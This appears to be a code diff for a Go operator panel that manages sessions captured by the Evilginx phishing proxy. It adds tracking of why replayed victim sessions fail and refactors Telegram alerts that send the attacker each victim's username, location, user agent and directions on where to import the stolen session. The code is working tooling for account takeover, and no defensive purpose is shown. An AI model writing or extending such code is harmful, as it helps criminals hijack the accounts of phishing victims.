@@ -26,7 +26,7 @@ import (
 //go:embed index.html
 var indexHTML []byte
 
-const version = "1.5.3"
+const version = "1.6.0"
 
 // ---- Evilginx data model (matches kgretzky/evilginx2 database.Session) ----
 
@@ -674,17 +674,26 @@ func loadSessions(dbPath string) ([]Session, error) {
 
 type victimState struct {
 	Used   bool   `json:"used"`
-	Status string `json:"status"` // inbox | copied | replayed | bounced | done
+	Status string `json:"status"` // inbox | bounced | done  (copied/replayed fold to inbox)
+	Bounce string `json:"bounce,omitempty"` // ca | ip | ua | dead
 	Notes  string `json:"notes"`
 }
 
+var bounceReasons = map[string]bool{"ca": true, "ip": true, "ua": true, "dead": true}
+
 func normalizeVState(st victimState) victimState {
-	if st.Status == "" {
+	switch st.Status {
+	case "copied", "replayed":
+		st.Status = "inbox"
+	case "":
 		if st.Used {
 			st.Status = "done"
 		} else {
 			st.Status = "inbox"
 		}
+	}
+	if st.Status != "bounced" || !bounceReasons[st.Bounce] {
+		st.Bounce = ""
 	}
 	st.Used = st.Status == "done"
 	return st
@@ -739,6 +748,9 @@ func vstateHandler() http.HandlerFunc {
 				} else if st.Status == "done" || st.Status == "" {
 					st.Status = "inbox"
 				}
+			}
+			if _, ok := r.Form["bounce"]; ok {
+				st.Bounce = strings.ToLower(strings.TrimSpace(r.FormValue("bounce")))
 			}
 			if _, ok := r.Form["notes"]; ok {
 				st.Notes = r.FormValue("notes")
@@ -921,6 +933,76 @@ func init() {
 	}
 }
 
+func relAge(d time.Duration) string {
+	if d < 0 {
+		d = 0
+	}
+	sec := int(d.Seconds())
+	switch {
+	case sec < 60:
+		return fmt.Sprintf("hace %ds", sec)
+	case sec < 3600:
+		return fmt.Sprintf("hace %dm", sec/60)
+	case sec < 86400:
+		return fmt.Sprintf("hace %dh", sec/3600)
+	default:
+		return fmt.Sprintf("hace %dd", sec/86400)
+	}
+}
+
+// formatTelegramAlert is the operator ping: type, country, UA, where to import.
+// Never includes cookies or passwords. Age + stable #id so Telegram can be
+// matched to the inbox row in ~20s.
+func formatTelegramAlert(s Session, loot lootInfo, plan replayPlan, ginfo geoInfo, now time.Time, minimal bool) string {
+	age := relAge(now.Sub(time.Unix(s.capturedAt(), 0)))
+	where := ginfo.CountryCode
+	if where == "" {
+		where = "?"
+	}
+	if minimal {
+		ua := plan.UASummary
+		if ua == "" {
+			return fmt.Sprintf("#%d · %s · %s · %s · panel Replay", s.Id, age, plan.Label, where)
+		}
+		return fmt.Sprintf("#%d · %s · %s · %s · %s", s.Id, age, plan.Label, where, ua)
+	}
+	persist := "sesión"
+	if loot.Persistent {
+		persist = "persistente"
+	}
+	user := s.Username
+	if user == "" {
+		user = "(sin usuario)"
+	}
+	loc := ginfo.Country
+	if loc != "" {
+		if ginfo.CountryCode != "" {
+			loc += " (" + ginfo.CountryCode + ")"
+		}
+		if ginfo.City != "" {
+			loc += " · " + ginfo.City
+		}
+	} else if s.RemoteAddr != "" {
+		loc = s.RemoteAddr
+	}
+	var b strings.Builder
+	fmt.Fprintf(&b, "#%d · %s\n%s · %s\n\n", s.Id, age, plan.Label, persist)
+	fmt.Fprintf(&b, "`%s`\n", user)
+	if loc != "" {
+		fmt.Fprintf(&b, "%s\n", loc)
+	}
+	if plan.UASummary != "" {
+		fmt.Fprintf(&b, "%s\n", plan.UASummary)
+	}
+	if plan.ImportOn != "" {
+		fmt.Fprintf(&b, "\nImportar en:\n%s\nLuego:\n%s\n", plan.ImportOn, plan.ThenOpen)
+	}
+	if plan.Avoid != "" {
+		fmt.Fprintf(&b, "Evitar: %s\n", plan.Avoid)
+	}
+	return strings.TrimSpace(b.String())
+}
+
 func sendTelegram(token, chat, text string) error {
 	form := url.Values{}
 	form.Set("chat_id", chat)
@@ -970,63 +1052,11 @@ func startWatcher(dbPath string, interval time.Duration) {
 				if !cfg.TGEnabled || cfg.TGToken == "" || cfg.TGChat == "" {
 					continue
 				}
-				var msg string
 				loot := x.inspectLoot()
 				plan := x.replayPlan()
 				ginfo := geo.lookup(x.RemoteAddr, true)
 				plan.AcceptLang = suggestAcceptLang(ginfo.CountryCode)
-				if cfg.MinimalAlerts {
-					where := ginfo.CountryCode
-					if where == "" {
-						where = "?"
-					}
-					msg = fmt.Sprintf("Sesión %s · %s · %s · panel Replay", plan.Label, where, plan.UASummary)
-				} else {
-					user := x.Username
-					if user == "" {
-						user = "(sin usuario)"
-					}
-					persist := "sesión"
-					if loot.Persistent {
-						persist = "persistente"
-					}
-					loc := x.RemoteAddr
-					if ginfo.Country != "" {
-						loc = ginfo.Country
-						if ginfo.CountryCode != "" {
-							loc += " (" + ginfo.CountryCode + ")"
-						}
-						if ginfo.City != "" {
-							loc += " · " + ginfo.City
-						}
-					}
-					netw := ginfo.ASN
-					if ginfo.ISP != "" && !strings.Contains(netw, ginfo.ISP) {
-						if netw != "" {
-							netw += " · " + ginfo.ISP
-						} else {
-							netw = ginfo.ISP
-						}
-					}
-					var b strings.Builder
-					fmt.Fprintf(&b, "%s · %s\n\n", plan.Label, persist)
-					fmt.Fprintf(&b, "`%s`\n", user)
-					fmt.Fprintf(&b, "%s\n", loc)
-					if netw != "" {
-						fmt.Fprintf(&b, "%s\n", netw)
-					}
-					if plan.UASummary != "" {
-						fmt.Fprintf(&b, "%s\n", plan.UASummary)
-					}
-					if plan.ImportOn != "" {
-						fmt.Fprintf(&b, "\nImportar en:\n%s\nLuego:\n%s\n", plan.ImportOn, plan.ThenOpen)
-					}
-					if plan.Avoid != "" {
-						fmt.Fprintf(&b, "Evitar: %s\n", plan.Avoid)
-					}
-					fmt.Fprintf(&b, "\nPanel → Replay · #%d", x.Id)
-					msg = b.String()
-				}
+				msg := formatTelegramAlert(x, loot, plan, ginfo, time.Now(), cfg.MinimalAlerts)
 				if err := sendTelegram(cfg.TGToken, cfg.TGChat, msg); err != nil {
 					log.Println("telegram:", err)
 				}
